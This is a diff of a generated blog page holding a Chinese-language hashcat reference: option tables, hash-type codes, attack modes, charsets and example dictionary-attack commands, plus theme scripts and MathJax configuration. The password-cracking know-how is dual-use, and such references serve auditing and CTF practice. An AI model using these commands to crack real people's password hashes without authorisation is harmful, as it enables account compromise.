 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat [选项]... <span class="built_in">hash</span>|<span class="built_in">hash</span>文件|hccapx文件 [字典|掩码|目录]...</span><br></pre></td></tr></table></figure>
+
 <table>
 <thead>
 <tr>
@@ -304,8 +325,7 @@
 <th>用例</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>-m,–hash-type</td>
 <td>数字</td>
 <td>Hash种类，参见下面的参考</td>
@@ -815,8 +835,7 @@
 <td>在X处停止掩码递增</td>
 <td>–increment-max=8</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="②-Hash种类"><a href="#②-Hash种类" class="headerlink" title="② Hash种类"></a>② Hash种类</h3><table>
 <thead>
 <tr>
@@ -825,8 +844,7 @@
 <th>类别</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>900</td>
 <td>MD4</td>
 <td>纯Hash</td>
@@ -1981,8 +1999,7 @@
 <td>Plaintext</td>
 <td>Blockchain明文，我的钱包</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="③-输出格式"><a href="#③-输出格式" class="headerlink" title="③ 输出格式"></a>③ 输出格式</h3><table>
 <thead>
 <tr>
@@ -1990,8 +2007,7 @@
 <th>格式</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>1</td>
 <td>hash[:salt]</td>
 </tr>
@@ -2051,8 +2067,7 @@
 <td>15</td>
 <td>hash[:salt]:plain:hex_plain:crack_pos</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="④-调试模式规则"><a href="#④-调试模式规则" class="headerlink" title="④ 调试模式规则"></a>④ 调试模式规则</h3><table>
 <thead>
 <tr>
@@ -2060,8 +2075,7 @@
 <th>格式</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>1</td>
 <td>查找规则</td>
 </tr>
@@ -2077,8 +2091,7 @@
 <td>4</td>
 <td>原始词:查找规则:已处理词</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="⑤-攻击模式"><a href="#⑤-攻击模式" class="headerlink" title="⑤ 攻击模式"></a>⑤ 攻击模式</h3><table>
 <thead>
 <tr>
@@ -2086,8 +2099,7 @@
 <th>模式</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>0</td>
 <td>直接</td>
 </tr>
@@ -2107,8 +2119,7 @@
 <td>7</td>
 <td>混合 掩码 + 字典</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="⑥-内置字符集"><a href="#⑥-内置字符集" class="headerlink" title="⑥ 内置字符集"></a>⑥ 内置字符集</h3><table>
 <thead>
 <tr>
@@ -2117,8 +2128,7 @@
 <th></th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>l</td>
 <td>abcdefghijklmnopqrstuvwxyz</td>
 <td></td>
@@ -2156,9 +2166,9 @@
 <tr>
 <td>b</td>
 <td>0x00 - 0xff</td>
+<td></td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="⑦-OpenCL设备类型"><a href="#⑦-OpenCL设备类型" class="headerlink" title="⑦ OpenCL设备类型"></a>⑦ OpenCL设备类型</h3><table>
 <thead>
 <tr>
@@ -2166,8 +2176,7 @@
 <th>设备类型</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>1</td>
 <td>CPU</td>
 </tr>
@@ -2179,8 +2188,7 @@
 <td>3</td>
 <td>现场可编程门阵列(FPGA)，数字信号处理器(DSP)，协处理器(Co-Processor)</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="⑧-工作负载配置文件"><a href="#⑧-工作负载配置文件" class="headerlink" title="⑧ 工作负载配置文件"></a>⑧ 工作负载配置文件</h3><table>
 <thead>
 <tr>
@@ -2191,8 +2199,7 @@
 <th>桌面影响</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>1</td>
 <td>低</td>
 <td>2 ms</td>
@@ -2220,8 +2227,7 @@
 <td>疯狂的</td>
 <td>无法控制</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h3 id="⑨-基本用例"><a href="#⑨-基本用例" class="headerlink" title="⑨ 基本用例"></a>⑨ 基本用例</h3><table>
 <thead>
 <tr>
@@ -2230,8 +2236,7 @@
 <th>示例命令</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>字典</td>
 <td>$P$</td>
 <td>hashcat -a 0 -m 400 example400.hash example.dict</td>
@@ -2251,8 +2256,7 @@
 <td>MD5</td>
 <td>hashcat -a 1 -m 0 example0.hash example.dict example.dict</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 
       
 
@@ -2367,8 +2371,17 @@
   
 <nav id="article-nav">
   
+    <a href="/2019/05/29/隐写术(二)--传统数字图像隐写算法/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          隐写术(二)--传统数字图像隐写算法
+        
+      </div>
+    </a>
   
-    <a href="/2018/10/08/1.1-菜鸟学PWN之栈溢出学习/" id="article-nav-older" class="article-nav-link-wrap">
+  
+    <a href="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">1.1-菜鸟学PWN之栈溢出学习</div>
       <i class="icon-circle-right"></i>
     </a>
@@ -2428,7 +2441,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 killshadow
+    		&copy; 2019 killshadow
     	</div>
       	<div class="footer-right">
 		
@@ -2439,7 +2452,7 @@
     </div>
     <script>
 	var yiliaConfig = {
-		mathjax: false,
+		mathjax: [object Object],
 		isHome: false,
 		isPost: true,
 		isArchive: false,
@@ -2459,6 +2472,27 @@ if(!isFinite(o.call(this)))throw RangeError("Invalid time value");var t=this,n=t
 return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var e=r(54),i=r(2),o=e.get,u=e.key;e.exp({getOwnMetadata:function(t,n){return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=r(32),u=e.has,c=e.key,f=function(t,n,r){if(u(t,n,r))return!0;var e=o(n);return null!==e&&f(t,e,r)};e.exp({hasMetadata:function(t,n){return f(t,i(n),arguments.length<3?void 0:c(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=e.has,u=e.key;e.exp({hasOwnMetadata:function(t,n){return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){var e=r(54),i=r(2),o=r(26),u=e.key,c=e.set;e.exp({metadata:function(t,n){return function(r,e){c(t,n,(void 0!==e?i:o)(r),u(e))}}})},function(t,n,r){var e=r(1);e(e.P+e.R,"Set",{toJSON:r(165)("Set")})},function(t,n,r){"use strict";var e=r(1),i=r(147)(!0);e(e.P,"String",{at:function(t){return i(this,t)}})},function(t,n,r){"use strict";var e=r(1),i=r(46),o=r(16),u=r(122),c=r(120),f=RegExp.prototype,a=function(t,n){this._r=t,this._s=n};r(139)(a,"RegExp String",function(){var t=this._r.exec(this._s);return{value:t,done:null===t}}),e(e.P,"String",{matchAll:function(t){if(i(this),!u(t))throw TypeError(t+" is not a regexp!");var n=String(this),r="flags"in f?String(t.flags):c.call(t),e=new RegExp(t.source,~r.indexOf("g")?r:"g"+r);return e.lastIndex=o(t.lastIndex),new a(e,n)}})},function(t,n,r){"use strict";var e=r(1),i=r(181);e(e.P,"String",{padEnd:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0,!1)}})},function(t,n,r){"use strict";var e=r(1),i=r(181);e(e.P,"String",{padStart:function(t){return i(this,t,arguments.length>1?arguments[1]:void 0,!0)}})},function(t,n,r){"use strict";r(82)("trimLeft",function(t){return function(){return t(this,1)}},"trimStart")},function(t,n,r){"use strict";r(82)("trimRight",function(t){return function(){return t(this,2)}},"trimEnd")},function(t,n,r){r(153)("asyncIterator")},function(t,n,r){r(153)("observable")},function(t,n,r){var e=r(1);e(e.S,"System",{global:r(3)})},function(t,n,r){for(var e=r(155),i=r(28),o=r(3),u=r(27),c=r(80),f=r(7),a=f("iterator"),s=f("toStringTag"),l=c.Array,h=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],v=0;v<5;v++){var p,d=h[v],y=o[d],g=y&&y.prototype;if(g){g[a]||u(g,a,l),g[s]||u(g,s,d),c[d]=l;for(p in e)g[p]||i(g,p,e[p],!0)}}},function(t,n,r){var e=r(1),i=r(151);e(e.G+e.B,{setImmediate:i.set,clearImmediate:i.clear})},function(t,n,r){var e=r(3),i=r(1),o=r(121),u=r(207),c=e.navigator,f=!!c&&/MSIE .\./.test(c.userAgent),a=function(t){return f?function(n,r){return t(o(u,[].slice.call(arguments,2),"function"==typeof n?n:Function(n)),r)}:t};i(i.G+i.B+i.F*f,{setTimeout:a(e.setTimeout),setInterval:a(e.setInterval)})},function(t,n,r){r(330),r(269),r(271),r(270),r(273),r(275),r(280),r(274),r(272),r(282),r(281),r(277),r(278),r(276),r(268),r(279),r(283),r(284),r(236),r(238),r(237),r(286),r(285),r(256),r(266),r(267),r(257),r(258),r(259),r(260),r(261),r(262),r(263),r(264),r(265),r(239),r(240),r(241),r(242),r(243),r(244),r(245),r(246),r(247),r(248),r(249),r(250),r(251),r(252),r(253),r(254),r(255),r(317),r(322),r(329),r(320),r(312),r(313),r(318),r(323),r(325),r(308),r(309),r(310),r(311),r(314),r(315),r(316),r(319),r(321),r(324),r(326),r(327),r(328),r(231),r(233),r(232),r(235),r(234),r(220),r(218),r(224),r(221),r(227),r(229),r(217),r(223),r(214),r(228),r(212),r(226),r(225),r(219),r(222),r(211),r(213),r(216),r(215),r(230),r(155),r(302),r(307),r(184),r(303),r(304),r(305),r(306),r(287),r(183),r(185),r(186),r(342),r(331),r(332),r(337),r(340),r(341),r(335),r(338),r(336),r(339),r(333),r(334),r(288),r(289),r(290),r(291),r(292),r(295),r(293),r(294),r(296),r(297),r(298),r(299),r(301),r(300),r(343),r(369),r(372),r(371),r(373),r(374),r(370),r(375),r(376),r(354),r(357),r(353),r(351),r(352),r(355),r(356),r(346),r(368),r(377),r(345),r(347),r(349),r(348),r(350),r(359),r(360),r(362),r(361),r(364),r(363),r(365),r(366),r(367),r(344),r(358),r(380),r(379),r(378),t.exports=r(52)},function(t,n){function r(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var r=t.nextSibling;return r?t.parentNode.insertBefore(n,r):t.parentNode.appendChild(n)}t.exports=r},,,,,,,,,function(t,n,r){(function(n,r){!function(n){"use strict";function e(t,n,r,e){var i=n&&n.prototype instanceof o?n:o,u=Object.create(i.prototype),c=new p(e||[]);return u._invoke=s(t,r,c),u}function i(t,n,r){try{return{type:"normal",arg:t.call(n,r)}}catch(t){return{type:"throw",arg:t}}}function o(){}function u(){}function c(){}function f(t){["next","throw","return"].forEach(function(n){t[n]=function(t){return this._invoke(n,t)}})}function a(t){function n(r,e,o,u){var c=i(t[r],t,e);if("throw"!==c.type){var f=c.arg,a=f.value;return a&&"object"==typeof a&&m.call(a,"__await")?Promise.resolve(a.__await).then(function(t){n("next",t,o,u)},function(t){n("throw",t,o,u)}):Promise.resolve(a).then(function(t){f.value=t,o(f)},u)}u(c.arg)}function e(t,r){function e(){return new Promise(function(e,i){n(t,r,e,i)})}return o=o?o.then(e,e):e()}"object"==typeof r&&r.domain&&(n=r.domain.bind(n));var o;this._invoke=e}function s(t,n,r){var e=P;return function(o,u){if(e===F)throw new Error("Generator is already running");if(e===M){if("throw"===o)throw u;return y()}for(r.method=o,r.arg=u;;){var c=r.delegate;if(c){var f=l(c,r);if(f){if(f===A)continue;return f}}if("next"===r.method)r.sent=r._sent=r.arg;else if("throw"===r.method){if(e===P)throw e=M,r.arg;r.dispatchException(r.arg)}else"return"===r.method&&r.abrupt("return",r.arg);e=F;var a=i(t,n,r);if("normal"===a.type){if(e=r.done?M:j,a.arg===A)continue;return{value:a.arg,done:r.done}}"throw"===a.type&&(e=M,r.method="throw",r.arg=a.arg)}}}function l(t,n){var r=t.iterator[n.method];if(r===g){if(n.delegate=null,"throw"===n.method){if(t.iterator.return&&(n.method="return",n.arg=g,l(t,n),"throw"===n.method))return A;n.method="throw",n.arg=new TypeError("The iterator does not provide a 'throw' method")}return A}var e=i(r,t.iterator,n.arg);if("throw"===e.type)return n.method="throw",n.arg=e.arg,n.delegate=null,A;var o=e.arg;return o?o.done?(n[t.resultName]=o.value,n.next=t.nextLoc,"return"!==n.method&&(n.method="next",n.arg=g),n.delegate=null,A):o:(n.method="throw",n.arg=new TypeError("iterator result is not an object"),n.delegate=null,A)}function h(t){var n={tryLoc:t[0]};1 in t&&(n.catchLoc=t[1]),2 in t&&(n.finallyLoc=t[2],n.afterLoc=t[3]),this.tryEntries.push(n)}function v(t){var n=t.completion||{};n.type="normal",delete n.arg,t.completion=n}function p(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(h,this),this.reset(!0)}function d(t){if(t){var n=t[w];if(n)return n.call(t);if("function"==typeof t.next)return t;if(!isNaN(t.length)){var r=-1,e=function n(){for(;++r<t.length;)if(m.call(t,r))return n.value=t[r],n.done=!1,n;return n.value=g,n.done=!0,n};return e.next=e}}return{next:y}}function y(){return{value:g,done:!0}}var g,b=Object.prototype,m=b.hasOwnProperty,x="function"==typeof Symbol?Symbol:{},w=x.iterator||"@@iterator",S=x.asyncIterator||"@@asyncIterator",_=x.toStringTag||"@@toStringTag",O="object"==typeof t,E=n.regeneratorRuntime;if(E)return void(O&&(t.exports=E));E=n.regeneratorRuntime=O?t.exports:{},E.wrap=e;var P="suspendedStart",j="suspendedYield",F="executing",M="completed",A={},N={};N[w]=function(){return this};var T=Object.getPrototypeOf,I=T&&T(T(d([])));I&&I!==b&&m.call(I,w)&&(N=I);var k=c.prototype=o.prototype=Object.create(N);u.prototype=k.constructor=c,c.constructor=u,c[_]=u.displayName="GeneratorFunction",E.isGeneratorFunction=function(t){var n="function"==typeof t&&t.constructor;return!!n&&(n===u||"GeneratorFunction"===(n.displayName||n.name))},E.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,c):(t.__proto__=c,_ in t||(t[_]="GeneratorFunction")),t.prototype=Object.create(k),t},E.awrap=function(t){return{__await:t}},f(a.prototype),a.prototype[S]=function(){return this},E.AsyncIterator=a,E.async=function(t,n,r,i){var o=new a(e(t,n,r,i));return E.isGeneratorFunction(n)?o:o.next().then(function(t){return t.done?t.value:o.next()})},f(k),k[_]="Generator",k.toString=function(){return"[object Generator]"},E.keys=function(t){var n=[];for(var r in t)n.push(r);return n.reverse(),function r(){for(;n.length;){var e=n.pop();if(e in t)return r.value=e,r.done=!1,r}return r.done=!0,r}},E.values=d,p.prototype={constructor:p,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=g,this.done=!1,this.delegate=null,this.method="next",this.arg=g,this.tryEntries.forEach(v),!t)for(var n in this)"t"===n.charAt(0)&&m.call(this,n)&&!isNaN(+n.slice(1))&&(this[n]=g)},stop:function(){this.done=!0;var t=this.tryEntries[0],n=t.completion;if("throw"===n.type)throw n.arg;return this.rval},dispatchException:function(t){function n(n,e){return o.type="throw",o.arg=t,r.next=n,e&&(r.method="next",r.arg=g),!!e}if(this.done)throw t;for(var r=this,e=this.tryEntries.length-1;e>=0;--e){var i=this.tryEntries[e],o=i.completion;if("root"===i.tryLoc)return n("end");if(i.tryLoc<=this.prev){var u=m.call(i,"catchLoc"),c=m.call(i,"finallyLoc");if(u&&c){if(this.prev<i.catchLoc)return n(i.catchLoc,!0);if(this.prev<i.finallyLoc)return n(i.finallyLoc)}else if(u){if(this.prev<i.catchLoc)return n(i.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return n(i.finallyLoc)}}}},abrupt:function(t,n){for(var r=this.tryEntries.length-1;r>=0;--r){var e=this.tryEntries[r];if(e.tryLoc<=this.prev&&m.call(e,"finallyLoc")&&this.prev<e.finallyLoc){var i=e;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=n&&n<=i.finallyLoc&&(i=null);var o=i?i.completion:{};return o.type=t,o.arg=n,i?(this.method="next",this.next=i.finallyLoc,A):this.complete(o)},complete:function(t,n){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&n&&(this.next=n),A},finish:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.finallyLoc===t)return this.complete(r.completion,r.afterLoc),v(r),A}},catch:function(t){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.tryLoc===t){var e=r.completion;if("throw"===e.type){var i=e.arg;v(r)}return i}}throw new Error("illegal catch attempt")},delegateYield:function(t,n,r){return this.delegate={iterator:d(t),resultName:n,nextLoc:r},"next"===this.method&&(this.arg=g),A}}}("object"==typeof n?n:"object"==typeof window?window:"object"==typeof self?self:this)}).call(n,function(){return this}(),r(158))}])</script><script src="/./main.0cf68a.js"></script><script>!function(){!function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)}("/slider.e37972.js")}()</script>
 
 
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
 
 <script>
 var _hmt = _hmt || [];
@@ -2472,7 +2506,7 @@ var _hmt = _hmt || [];
 
 <script>
     var yiliaConfig = {
-        mathjax: false,
+        mathjax: [object Object],
         isHome: false,
         isPost: true,
         isArchive: false,
@@ -2540,18 +2574,6 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">AOSP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android Developer</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Wireless</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Mobile Security</a>
               </li>
              
@@ -2561,6 +2583,22 @@ var _hmt = _hmt || [];
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">MISC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Android Developer</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Wireless</a>
               </li>
             
             <div class="clearfix"></div>
@@ -2716,6 +2754,23 @@ var _hmt = _hmt || [];
     </div>
 
 </div>
-  </div>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
 </body>
 </html>
